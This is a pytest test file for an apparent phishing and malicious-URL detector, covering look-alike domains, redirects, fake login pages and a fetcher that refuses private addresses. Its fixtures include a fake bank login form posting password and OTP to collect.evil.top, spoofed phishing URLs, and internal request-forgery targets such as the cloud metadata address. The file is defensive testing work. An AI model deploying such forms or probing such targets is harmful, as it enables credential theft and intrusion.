"""Module 5 (Malicious URL & Website): look-alikes, spoofing, redirects, fake login pages, safe fetching."""
import pytest

from app.detectors import malicious_url, page_inspector
from app.detectors.url_features_v2 import brand_in_host
from app.services import safe_fetch


def labels(r):
    return {i["label"] for i in r["indicators"] if i["triggered"]}


def scan(url):
    return malicious_url.analyze_url(url, "x", None, network=False)


# ---- who the address claims to be -----------------------------------------------------------
@pytest.mark.parametrize("host,brand", [
    ("hdfcbnak.com", "hdfcbank"),            # swapped letters
    ("paypa1.com", "paypal"),                # 1 for l
    ("amaz0n-prime.com", "amazon"),          # 0 for o
    ("sbi.co.in-netbanking.top", "sbi"),     # real brand domain used as a prefix
    ("jio-recharge-offer.top", "jio"),
])
def test_brand_impersonation_is_found(host, brand):
    assert brand_in_host(host) == brand


@pytest.mark.parametrize("host", ["netbanking.hdfcbank.com", "www.onlinesbi.sbi", "uidai.gov.in", "sbi.bank.in",
                                  "www.bput.ac.in", "hdfc.com", "google.com", "mysbiaccount.com"])
def test_official_and_unrelated_sites_are_not_impersonation(host):
    assert brand_in_host(host) is None


def test_spoofed_domain_scores_high_and_explains_why():
    r = scan("https://paypal.com.account-verify.co/signin")
    assert "'paypal' brand used in a domain it does not own" in labels(r) and r["riskScore"] >= 71


def test_lookalike_and_homograph():
    assert "Look-alike of hdfcbank" in labels(scan("https://hdfcbnak.com/")) 
    r = scan("https://xn--pple-43d.com/")
    assert any(l.startswith("Look-alike of apple using letters") for l in labels(r)) and r["riskScore"] >= 71


def test_open_redirect_to_untrusted_site_but_not_to_trusted_one():
    assert "Link forwards you to another website" in labels(scan("https://www.google.com/url?q=https://sbi-kyc.top/"))
    assert "Link forwards you to another website" not in labels(scan("https://www.google.com/search?q=https://www.wikipedia.org"))


def test_free_platforms_and_user_content_are_marked():
    for u in ("https://secure-update.netlify.app/office365/login.html", "https://docs.google.com/forms/d/e/x/viewform"):
        assert "Hosted on a free website platform / user-content service" in labels(scan(u))


@pytest.mark.parametrize("url", ["https://www.onlinesbi.sbi/", "https://netbanking.hdfcbank.com/netbanking/",
                                 "https://www.irctc.co.in/nget/train-search", "https://www.bput.ac.in/",
                                 "https://github.com/login", "https://www.cricbuzz.com/", "nykaa.com"])
def test_real_sites_stay_safe(url):
    assert scan(url)["riskScore"] <= 25


def test_typed_without_scheme_is_not_called_no_https():
    assert "No HTTPS encryption" not in labels(scan("nykaa.com"))
    assert "No HTTPS encryption" in labels(scan("http://nykaa.com"))


# ---- fake login page (HTML is only parsed, never run) -------------------------------------------
FAKE = """<html><head><title>SBI Online - Login</title><script>alert(1)</script></head><body>
<img alt="State Bank of India logo"><form action="https://collect.evil.top/save.php" method="post">
<input name="userid"><input type="password" name="pwd"><input name="otp" placeholder="Enter OTP"></form></body></html>"""


def test_page_inspector_finds_fake_login_signs():
    pg = page_inspector.inspect(FAKE, "https://sbi-secure-login.netlify.app/")
    assert pg["has_password"] and "sbi" in pg["brands_imitated"]
    assert pg["external_form_targets"] == ["collect.evil.top"] and pg["sensitive_fields"]


def test_page_on_the_real_site_is_not_imitation():
    pg = page_inspector.inspect(FAKE.replace("https://collect.evil.top/save.php", "/login"), "https://www.onlinesbi.sbi/")
    assert pg["brands_imitated"] == [] and pg["external_form_targets"] == []


def test_live_page_indicators_use_the_fetched_page(monkeypatch):
    monkeypatch.setattr(safe_fetch, "fetch", lambda url: {
        "status": "ok", "reason": "", "final_url": "https://sbi-secure-login.netlify.app/",
        "chain": [{"url": "https://bit.ly/x", "status": 301, "how": "start"},
                  {"url": "https://sbi-secure-login.netlify.app/", "status": 200, "how": "HTTP 301 redirect"}],
        "html": FAKE})
    inds, ev = malicious_url._page_indicators("https://bit.ly/x")
    got = {i["label"] for i in inds if i["triggered"]}
    assert {"Redirects to a different website", "Fake login page: brand login on the wrong website",
            "Form sends your data to another website", "Page asks for card / OTP / PIN / ID details"} <= got
    assert len(ev["redirectChain"]) == 2


# ---- the fetcher itself never touches local / private addresses ---------------------------------
@pytest.mark.parametrize("url", ["http://127.0.0.1/", "http://localhost:80/", "http://192.168.1.1/",
                                 "http://10.0.0.5/admin", "http://169.254.169.254/latest/meta-data/",
                                 "http://[::1]/", "file:///C:/Windows/win.ini", "ftp://example.com/",
                                 "http://example.com:22/"])
def test_safe_fetch_refuses_local_and_odd_targets(url):
    r = safe_fetch.fetch(url)
    assert r["status"] == "refused" and r["html"] == ""


def test_brand_nickname_on_free_platform_login_is_critical():
    r = scan("https://m365-mfa-renew.pages.dev/login?user=ashis")
    assert {"'microsoft' brand used in a domain it does not own", "Login / verification page on a free platform"} <= labels(r)
    assert r["riskScore"] >= 71


def test_ml_warning_is_not_shown_on_official_sites():
    r = scan("https://login.microsoftonline.com/")
    assert "Domain name resembles phishing domains (ML model)" not in labels(r) and r["riskScore"] <= 15


def test_brand_login_on_free_platform_routes_to_fake_login_page():
    from app.services import subtopic_router
    c = subtopic_router._classify_url("https://m365-mfa-renew.pages.dev/login?user=ashis", "")
    assert c.subtopic_id == "fake-login-page" and "domain-spoofing" in c.secondary
    assert subtopic_router._classify_url("https://paypal.com.account-verify.co/signin", "").subtopic_id == "domain-spoofing"


def test_at_sign_in_path_is_not_the_hidden_host_trick():
    """medium.com/@name and youtube.com/@channel are normal; only an '@' before the host hides the destination."""
    from app.detectors.malicious_url import analyze_url
    def labels(u):
        return [i["label"] for i in analyze_url(u, subtopic_id="malicious-url", network=False)["indicators"] if i["triggered"]]
    assert "'@' character in URL" not in labels("https://www.youtube.com/@MrBeast")
    assert "'@' character in URL" not in labels("https://medium.com/@ashis/learning-python")
    assert "'@' character in URL" in labels("http://paypal.com@evil.tk/x")
